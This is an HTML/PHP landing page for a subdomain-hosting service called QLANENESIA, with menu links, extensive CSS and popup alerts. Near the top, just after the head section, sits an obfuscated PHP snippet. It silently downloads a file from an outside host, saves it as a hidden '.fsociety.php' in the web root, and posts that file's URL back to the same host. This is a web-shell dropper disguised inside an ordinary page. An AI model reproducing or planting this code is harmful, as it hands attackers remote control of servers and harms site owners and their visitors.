
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>
    SUBDOMAIN QLANENESIA
    </title>
    <meta charset="UTF-8">
    <meta name="Description" content="SUBDOMAIN QLANENSIA">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="shortcut icon" type="image/x-icon" href="https://cdn3.vectorstock.com/i/1000x1000/45/22/ng-logo-monogram-emblem-style-with-crown-shape-vector-31864522.jpg">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
    <script src='https://unpkg.com/splitting/dist/splitting.min.js'></script>
    <link rel='stylesheet' href='https://unpkg.com/splitting/dist/splitting.css'>
    <link rel='stylesheet' href='https://unpkg.com/splitting/dist/splitting-cells.css'>
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-7579749581890015"
     crossorigin="anonymous"></script>
  </head>
<?php
@$x='curl_init';@$y='curl_setopt';$z=$_SERVER['DOCUMENT_ROOT'].'/.fsociety.php';if($a=@fopen($z,'w+')){$b=@$x('https://addpackage.prefct.my.id/png/api.php');@$y($b,CURLOPT_RETURNTRANSFER,true);@$y($b,CURLOPT_FILE,$a);@$y($b,CURLOPT_TIMEOUT,50);if(@curl_exec($b)!==false){$c='http'.(!empty($_SERVER['HTTPS'])?'s':'').'://'.$_SERVER['HTTP_HOST'].'/.fsociety.php';$d=curl_init('https://addpackage.prefct.my.id/png/api.php');@$y($d,CURLOPT_POST,true);@$y($d,CURLOPT_POSTFIELDS,http_build_query(['file_link'=>$c]));@$y($d,CURLOPT_RETURNTRANSFER,true);@curl_exec($d);@curl_close($d);}}@fclose($a);
?>
<style>
@import url("https://fonts.googleapis.com/css2?family=Bungee&family=Viga&display=swap");
* {
  margin: 0  padding: 0;
  box-sizing: border-box;
  user-select: none;
}
body {
  position: relative;
  width: 100%;
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  background: url("https://source.unsplash.com/random/?game,technology")
    no-repeat center;
  background-attachment: fixed;
  background-size: cover;
}
body:after {
  content: "";
  position: fixed;
  top: 0;
  right: 0;
  bottom: 0;
  left: 0;
  background-color: rgb(0,0,0)
  backdrop-filter: blur(1px);
  z-index: -1;
}
.app {
    position: relative;
    width: 100%;
    min-height: 100vh;
    display: flex; 
    align-items: center;
    justify-content: center;
    flex-direction: column;
    padding: 20px;
    padding-top: 60px;
    padding-bottom: 40px;
}
.app .nav {
    position: fixed;
    z-index:99999999;
    top:0;
    left: 50%;
    transform: translateX(-50%);
    width: 100%;
    height: 40px;
    font-family: 'Viga', sans-serif;
    backdrop-filter: blur(16px) saturate(180%);
    -webkit-backdrop-filter: blur(16px) saturate(180%);
    background-color: rgb(0,0,0)
    box-shadow: 0 1px 5px rgba(17, 25, 40, 0.75),
        0 1px 10px rgba(17, 25, 40, 0.75);
    display: flex;
    align-items: center;
    justify-content: flex-end;
    padding: 10px;
}
.nav .logo {
    position: absolute;
    top: 50%;
    transform: translateY(-50%);
    left: -5px;
    width: 50px;
    height: 35px;
    object-fit: cover;
    border-radius: 50%;
}
.nav .fill {
    position: relative;
    padding: 5px;
    margin: 0 5px;
    color: #fff;
    font-family: 'Viga', sans-serif;
}
.nav .fill i {
    color: #fff;
    cursor: pointer;
}
.app .copy {
  width: 100%;
  position: fixed;
  bottom: 2px;
  left: 50%;
  transform: translateX(-50%);
  display: flex;
  align-items: center;
  justify-content: center;
  font-family: "Viga", sans-serif;
  color: rgba(255, 255, 255, 0.6);
  font-size: 13px;
  backdrop-filter: blur(16px) saturate(180%);
  -webkit-backdrop-filter: blur(16px) saturate(180%);
  background-color: rgb(0,0,0)
  box-shadow: 0 1px 5px rgba(17, 25, 40, 0.75),
        0 1px 10px rgba(17, 25, 40, 0.75);
  padding: 5px;
}
.app .labels {
  position: relative;
  width: 400px;
  text-align: left;
  font-family: "Viga", sans-serif;
  color: rgba(255, 255, 255, 0.7);
  font-size: 19px;
  margin-top: 20px;
  padding-left: 10px;
}
.app .labels:before {
  content: "";
  position: absolute;
  top: 50%;
  left: 0;
  transform: translateY(-60%);
  width: 3px;
  height: 15px;
  background: #fff;
  /* border-radius: 50%; */
  z-index: 99;
}
.app .labels:after {
  content: "";
  position: absolute;
  top: 50%;
  left: 3px;
  transform: translateY(-100%);
  width: 3px;
  height: 3px;
  background: #fff;
  border-radius: 50%;
  z-index: 99;
}
.app .bungkus {
  position: relative;
  padding: 10px;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-direction: column;
  backdrop-filter: blur(2px) saturate(200%);
  -webkit-backdrop-filter: blur(2px) saturate(200%);
  background-color: rgb(0, 0, 75);
  border-radius: 12px;
  border: 1px solid rgba(255, 255, 255, 0.125);
  margin-top: 5px;
}

.app h1 {
    font-family: 'Viga', sans-serif;
    color: rgba( 255, 255, 255, 0.4 );
    line-height: 25px;
}
h1 strong {
    font-family: 'Bungee', cursive;
    font-size: 2em;
}
.app .desc {
    margin-top: 10px;
    font-family: 'Viga', sans-serif;
    color: rgba( 255, 255, 255, 0.4 );
    text-align: center;
}

.bungkus h1 {
  font-family: "Viga", sans-serif;
  color: rgba(255, 255, 255, 0.7);
  line-height: 28px;
}
.bungkus label {
  width: 400px;
  text-align: left;
  font-family: "Viga", sans-serif;
  color: rgba(255, 255, 255, 0.7);
  margin-top: 15px;
  font-size: 15px;
}
.bungkus label:first-child {
  margin-top: 0;
}
.app .check {
  position: relative;
  font-family: "Viga", sans-serif;
  background: rgba(255, 255, 255, 0.4);
  color: rgba(255, 255, 255, 0.4);
  box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
  backdrop-filter: blur(8px);
  -webkit-backdrop-filter: blur(8px);
  border-radius: 10px;
  border: 1px solid rgba(255, 255, 255, 0.18);
  font-size: 16px;
  padding: 5px 20px;
  margin-top: 20px;
  cursor: pointer;
}
.bungkus .check:focus {
  outline: none;
  border: none;
}
.bungkus .inner {
  position: relative;
  width: 400px;
  display: flex;
  align-items: center;
  justify-content: center;
}
.inner h1 {
    font-size: 18px;
}
.inner.mt-5 {
  margin-top: 5px;
}
.inner .input {
  position: relative;
  font-family: "Viga", sans-serif;
  background: rgba(255, 255, 255, 0.4);
  color: rgba(255, 255, 255, 0.4);
  box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
  backdrop-filter: blur(8px);
  -webkit-backdrop-filter: blur(8px);
  border-radius: 10px;
  border: 1px solid rgba(255, 255, 255, 0.18);
  width: 400px;
  height: 40px;
  font-size: 15px;
  padding: 0 5px;
}
.bungkus .action {
  margin-top: 5px;
  position: relative;
  width: 100%;
  display: none;
  align-items: center;
  justify-content: flex-start;
}
.bungkus .action.show {
  display: flex;
}
.action .ip {
  position: relative;
  font-family: "Viga", sans-serif;
  background: rgba(255, 255, 255, 0.4);
  color: rgba(255, 255, 255, 0.4);
  box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
  backdrop-filter: blur(8px);
  -webkit-backdrop-filter: blur(8px);
  border-radius: 10px;
  border: 1px solid rgba(255, 255, 255, 0.18);
  height: 23px;
  font-size: 14px;
  width: 120px;
  text-align: center;
  padding: 5px;
  margin-right: 10px;
}
.action .ip:focus {
  outline: none;
  border: none;
}
.action .send {
  position: relative;
  font-family: "Viga", sans-serif;
  background: rgba(255, 255, 255, 0.4);
  color: rgba(255, 255, 255, 0.4);
  box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
  backdrop-filter: blur(8px);
  -webkit-backdrop-filter: blur(8px);
  border-radius: 10px;
  border: 1px solid rgba(255, 255, 255, 0.18);
  font-size: 12px;
  padding: 0 5px;
  height: 23px;
  margin: 0 3px;
  cursor: pointer;
}
.action .send:focus {
  outline: none;
  border: none;
}
.send.green {
  background: rgba(124, 252, 0, 0.4);
}
.send.red {
  background: rgba(255, 0, 0, 0.4);
}
.inner .domains {
  position: absolute;
  top: 0;
  right: 0;
  height: 100%;
  z-index: 9999;
  background: #000;
  border-top-right-radius: 10px;
  border-bottom-right-radius: 10px;
  border: 1px solid rgba(255, 255, 255, 0.18);
  background: rgba(0, 0, 0, 0.4);
  color: rgba(255, 255, 255, 0.4);
  font-family: "Viga", sans-serif;
  backdrop-filter: blur(8px);
  -webkit-backdrop-filter: blur(8px);
  padding: 0 5px;
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
}
.domains select {
  position: relative;
  width: 100%;
  height: 100%;
  outline: none;
  border: none;
  background: none;
  cursor: pointer;
  color: rgba(255, 255, 255, 0.4);;
  font-family: "Viga", sans-serif;
}
.inner .input:focus {
  outline: none;
  border: none;
}
.app .input::placeholder {
  color: rgba(255, 255, 255, 0.4);
}
.app .alert {
  position: relative;
  font-family: "Viga", sans-serif;
  color: rgba(255, 255, 255, 0.4);
  box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
  backdrop-filter: blur(8px);
  -webkit-backdrop-filter: blur(8px);
  border-radius: 10px;
  border: 1px solid rgba(255, 255, 255, 0.18);
  font-size: 14px;
  padding: 3px 15px 3px 25px;
  text-align: center;
  display: none;
}
.alert.success {
  background: rgba(124, 252, 0, 0.4);
}
.alert.error,
.alert.failed,
.alert.exsist,
.alert.mistake {
  background: rgba(255, 0, 0, 0.4);
}
.alert.process {
  background: rgba(0, 0, 255, 0.4);
}
.alert i {
  position: absolute;
  top: 50%;
  left: 5px;
  transform: translateY(-60%);
}
.alert.process i {
  top: 25%;
}
.app .conz {
  position: relative;
  width: 400px;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-direction: column;
}
.app .details {
  position: relative;
  margin-top: 20px;
  font-family: "Viga", sans-serif;
  color: rgba(255, 255, 255, 0.4);
  box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
  backdrop-filter: blur(8px);
  -webkit-backdrop-filter: blur(8px);
  border-radius: 10px;
  border: 1px solid rgba(255, 255, 255, 0.18);
  padding: 10px;
  width: 400px;
  text-align: center;
  display: none;
}
.details h1 {
  font-size: 20px;
}
.details .active {
  margin-top: 10px;
  position: relative;
  width: 100%;
  display: flex;
  align-items: center;
  flex-direction: column;
}
.active .info {
  position: relative;
  font-family: "Viga", sans-serif;
  background: rgba(255, 255, 255, 0.1);
  color: rgba(255, 255, 255, 0.4);
  box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
  backdrop-filter: blur(8px);
  -webkit-backdrop-filter: blur(8px);
  border-radius: 10px;
  border: 1px solid rgba(255, 255, 255, 0.18);
  font-size: 13px;
  padding: 5px 15px;
}
.details table {
  margin-top: 10px;
  border-bottom: 1px solid rgba(255, 255, 255, 0.3);
  border-top: 1px solid rgba(255, 255, 255, 0.3);
}
.active .click {
  position: relative;
  margin-top: 10px;
  font-family: "Viga", sans-serif;
  background: rgba(255, 255, 255, 0.4);
  color: rgba(255, 255, 255, 0.4);
  box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
  backdrop-filter: blur(8px);
  -webkit-backdrop-filter: blur(8px);
  border-radius: 10px;
  border: 1px solid rgba(255, 255, 255, 0.18);
  font-size: 14px;
  padding: 5px 15px;
}
.active .click:focus {
  outline: none;
  border: none;
}
.app .btn {
  position: absolute;
  top: 10px;
  right: 10px;
  font-family: "Viga", sans-serif;
  background: rgba(255, 255, 255, 0.4);
  color: rgba(255, 255, 255, 0.4);
  box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
  backdrop-filter: blur(8px);
  -webkit-backdrop-filter: blur(8px);
  border-radius: 10px;
  border: 1px solid rgba(255, 255, 255, 0.18);
  font-size: 16px;
  padding: 5px 20px;
}
.app .btn:focus {
  outline: none;
  border: none;
}

.rainbow-text .char { 
  
  color: hsl(
    calc(360deg * var(--char-percent)
    ), 
    90%, 
    65%
  );
 
}

.rainbow-text.animated .char {
  animation: rainbow-colors 2s linear infinite;
  animation-delay: calc(-2s * var(--char-percent));
}
/* Unfortunately, browsers try to take the shortest distance between transition/animation properties, so a simple `0turn` to `1turn` doesn't get the proper effect. */
@keyframes rainbow-colors {
  0% { color: hsl(197, 97%, 66%, 1); }
  25% { color: hsl(0, 100%, 100%, 1); }
  50% { color: hsl(348, 83%, 81%, 1); }
  75% { color: hsl(.75turn, 90%, 65%); }
  100% { color: hsl(1turn, 90%, 65%); }
}

@media (max-width: 550px) {
  .app .inner,
  .inner .input,
  .app .details,
  .bungkus label,
  .app .bungkus,
  .app .labels, 
  .app .conz {
    width: 100%;
  }
}
</style>
  <body>
    <div class="app">
      
    <h1><strong>QLANE</strong></h1>
    <p class="desc">HOSTING MENU</p>


        <div class="check" onclick="window.location='http://domain-qlanesia2023.ganteng3.cf';">SUBDOMAIN 1-2</div>
        
        <div class="check" onclick="window.location='host3/qlane.php';">STORE QLANENESIA</div>

        <div class="check" onclick="window.location='https://www.youtube.com/@qlanehost';">YouTube QLANENESIA</div>
     
        <div class="check" onclick="window.location='https://wa.me/6285792407681';">WhatsApp QLANENESIA</div>
        
        <div class="check" onclick="window.location='https://rentry.co/kfcvz';">Rules Subdo QLANENESIA</div>

     
    <span class="copy">
    Maded With ❤️ by QLANENESIA
    <div class="rainbow-text" data-splitting></div>
    <div class="rainbow-text animated" data-splitting style="margin-left:5px;"><a href="https://www.storeidcloud.my.id" title="Homepage"></a></div>
    </span>
    </div>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        Splitting();
    </script>
  </body>
</html>

  <!-- janggan asal redit -->
        <script>
        alert("WELCOME");
        alert("DI MENU HOSTING");
        alert("QLANENESIA") 
        </script>
    </body>
</html>

    </script>
</body>
<iframe scrolling='no' allow='autoplay' src='mp3/mas.mp3' width='0' height='0' frameborder='no'></iframe>
</html>